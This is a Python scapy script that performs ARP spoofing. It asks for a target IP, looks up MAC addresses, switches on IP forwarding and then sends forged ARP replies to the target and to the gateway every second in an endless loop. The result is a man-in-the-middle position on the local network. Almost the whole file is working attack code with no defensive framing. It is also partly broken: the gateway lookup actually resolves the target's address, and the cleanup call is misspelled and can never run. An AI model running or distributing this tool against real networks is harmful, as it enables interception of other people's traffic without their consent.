import time
import scapy.all as scapy
import os
import sys
from termcolor import colored
gateway_ip = "192.168.0.1"
target_ip=input("Enter the targetted ip: ")

def get_mac_from_ip(ip_address: str):
    # dst="ff:ff:ff:ff:ff:ff" broadcasts the request to the whole network
    ans = scapy.srp1(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/
                     scapy.ARP(pdst=ip_address, hwdst="ff:ff:ff:ff:ff:ff"),timeout=2,verbose=0,)
    if ans:
        return ans.hwsrc
    else:
        return None
def resolve_ip(name: str, ip_address: str):
    print(f"Resolving MAC address for {name} {target_ip}")
    # Resolve the target's MAC address
    mac = get_mac_from_ip(target_ip)
    if mac == None:
        print(f"Unable to resolve IP address. Exiting!")
        sys.exit(0)
    print(f"Resolved to {mac}")
    return mac
# Resolve the MAC addresses
target_mac = resolve_ip("target", target_ip)
gateway_mac = resolve_ip("gateway", gateway_ip)
# Build the packets
target_packet = scapy.Ether(dst=target_mac) / scapy.ARP(
    op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip
)
router_packet = scapy.Ether(dst=gateway_mac) / scapy.ARP(
    op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)
os.system("sysctl -w net.ipv4.ip_forward=1")
print(colored(("Sending packets......."),'green'))
# Loop forever and beacon packets
try:
    while True:
        scapy.sendp([target_packet, router_packet], verbose=0)
        # Sleep for 1 second between beacons
        time.sleep(1)
except KeyboardInterrupt:
    sys.exit(1)
os.sytem("sysctl -w net.ipv4.ip_forward=0")